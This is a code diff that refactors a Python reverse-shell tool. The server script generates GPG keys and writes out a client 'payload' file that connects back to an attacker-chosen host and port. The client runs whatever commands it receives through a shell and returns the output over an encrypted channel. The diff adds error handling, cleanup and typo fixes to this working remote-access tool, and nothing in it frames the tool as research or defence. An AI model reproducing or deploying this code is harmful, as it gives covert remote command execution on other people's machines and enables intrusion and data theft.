@@ -1,11 +1,27 @@
-from os import times
 import socket
 import sys
+import os
 import gnupg
-import sys
+from subprocess import Popen, PIPE, STDOUT
 
 gpg = gnupg.GPG()
 gpg.encoding = 'utf-8'
+
+def send_cipher(sock, msg, recipient_key):
+    ciphertext = gpg.encrypt(msg, recipient_key, always_trust=True)
+    if not ciphertext.ok:
+        print("Encryption failed:", ciphertext.status)
+        return False
+    sock.send(ciphertext.data)
+    return True
+
+def recv_cipher(sock):
+    ciphertext = sock.recv(BUFFER_SIZE)
+    plaintext = gpg.decrypt(ciphertext.decode())
+    if not plaintext.ok:
+        print("Decryption failed:", plaintext.status)
+        return None
+    return plaintext.data.decode()
 
 if "--init" in sys.argv:
     HOST = input("Enter host (ip or domain) : ")
@@ -22,6 +38,10 @@ Name-Email: server@example.com
 %commit""" 
 
     key = gpg.gen_key(gen_input) # GenKey
+    if not key:
+        print("Key generation failed")
+        sys.exit(1)
+    
     exported_public_key = gpg.export_keys(key.fingerprint)
 
     client_script_txt = f'''import socket
@@ -30,21 +50,28 @@ import sys
 import os
 import gnupg
 
-def send_cipher(msg):
-    ciphertext = gpg.encrypt(msg, server_key, always_trust=True)
-    sock.send(ciphertext.data)
+gpg = gnupg.GPG()
+gpg.encoding = "utf-8"
 
-def recv_cipher():
+def send_cipher(sock, msg, recipient_key):
+    ciphertext = gpg.encrypt(msg, recipient_key, always_trust=True)
+    if not ciphertext.ok:
+        print("Encryption failed:", ciphertext.status)
+        return False
+    sock.send(ciphertext.data)
+    return True
+
+def recv_cipher(sock):
     ciphertext = sock.recv(BUFFER_SIZE)
     plaintext = gpg.decrypt(ciphertext.decode())
+    if not plaintext.ok:
+        print("Decryption failed:", plaintext.status)
+        return None
     return plaintext.data.decode()
 
 HOST = "{HOST}"
 PORT = {PORT}
 BUFFER_SIZE = 4096
-
-gpg = gnupg.GPG()
-gpg.encoding = "utf-8"
 
 server_key_pem = """{exported_public_key}
 """
@@ -61,9 +88,12 @@ Name-Email: snake@example.com
 """
 
 import_result = gpg.import_keys(server_key_pem)
-server_key: str = import_result.fingerprints[0]
+server_key = import_result.fingerprints[0]
 
 key = gpg.gen_key(gen_input) # GenKey
+if not key:
+    print("Key generation failed")
+    sys.exit(1)
 
 exported_public_key = gpg.export_keys(key.fingerprint)
 
@@ -72,83 +102,70 @@ print("Initiating Connection...")
 
 try:
     sock.connect((HOST, PORT))
-except:
-    print("Couldn't connect to server, exiting...")
+except Exception as e:
+    print("Couldn't connect to server:", e)
     sys.exit()
 
-print("Connection estabilished with Sucess!")
+print("Connection established with success!")
 
 sock.send(os.getcwd().encode())
 
 res = sock.recv(BUFFER_SIZE).decode()
 if res != "ok":
-    print("Conection refused by server, exiting...")
+    print("Connection refused by server, exiting...")
     sys.exit()
 
 sock.send(exported_public_key.encode())
 
-# Looping on commands
 while True:
-    command = recv_cipher()
+    command = recv_cipher(sock)
 
     if command == "exit":
         print("Exiting...")
         sock.close()
         break
-                    
-    # Navegate into directories
+
     if command.startswith("cd"):
         try:
             os.chdir(command[3:])
         except Exception as e:
-            send_cipher(str(e))
+            send_cipher(sock, str(e), server_key)
             continue
-        send_cipher(os.getcwd())
+        send_cipher(sock, os.getcwd(), server_key)
         continue
 
     command_output = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-
-    send_cipher(command_output.stdout.read().decode())'''
+    send_cipher(sock, command_output.stdout.read().decode(), server_key)'''
 
     with open("reverseshell-client.py", "w") as f:
         f.write(client_script_txt)
 
-    print("Payload created at : ./reverseshell-client.py")
+    print("Payload created at: ./reverseshell-client.py")
     sys.exit()
 
-
-def send_cipher(msg):
-    ciphertext = gpg.encrypt(msg, client_key, always_trust=True)
-    client.send(ciphertext.data)
-
-def recv_cipher():
-    ciphertext = client.recv(BUFFER_SIZE)
-    plaintext = gpg.decrypt(ciphertext.decode())
-    return plaintext.data.decode()
-
 HOST = "0.0.0.0"
-PORT = int(input("Enter port number : "))
+PORT = int(input("Enter port number: "))
 BUFFER_SIZE = 4096
 
 print("Loading private key...")
 public_key = None
 public_keys = gpg.list_keys()
 for key in public_keys:
-    if key["uids"][0] == "Server <server@example.com>":
+    if "Server <server@example.com>" in key["uids"]:
         public_key = key
+        break
 
-if public_key == None:
-    print("Error: Server keys has not been initiated, please run the following command :\nreverseshell-server.py --init")
-    sys.exit()
+if not public_key:
+    print("Error: Server keys have not been initiated. Please run the following command: reverseshell-server.py --init")
+    sys.exit(1)
 
 public_key_pem = gpg.export_keys(public_key["keyid"])
 
-print(f"--> Server Started on {HOST}!")
-print("--> Listening For Client Connection...")
+print(f"--> Server started on {HOST}!")
+print("--> Listening for client connection...")
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((HOST, PORT))
-
 server.listen(1)
 
 print("Waiting for connection...")
@@ -161,34 +178,37 @@ while True:
     client.send(b"ok")
 
     client_key = gpg.import_keys(client.recv(BUFFER_SIZE).decode())
+    if not client_key:
+        print("Failed to import client key")
+        client.close()
+        continue
     client_key = client_key.fingerprints[0]
 
     while True:           
         message_command = input(f'Pwd: {pwd} > ')
       
-        # Exiting keyword
         if message_command == "exit":
             print("Closing...")
-            send_cipher("exit")
+            send_cipher(client, "exit", client_key)
             client.close()
             server.close()
             sys.exit()
 
         if message_command.startswith("cd"):
-            send_cipher(message_command.encode())
-            res = recv_cipher()
+            send_cipher(client, message_command, client_key)
+            res = recv_cipher(client)
             if res.startswith("[Errno"):
                 print(res)
             else:
                 pwd = res
             continue
 
-        if message_command == "":
+        if not message_command:
             print("Missing command!")
             continue
         
-        send_cipher(message_command.encode())
-
-        receive_message = recv_cipher()
+        send_cipher(client, message_command, client_key)
+        receive_message = recv_cipher(client)
         
-        print(receive_message)
+        if receive_message:
+            print(receive_message)
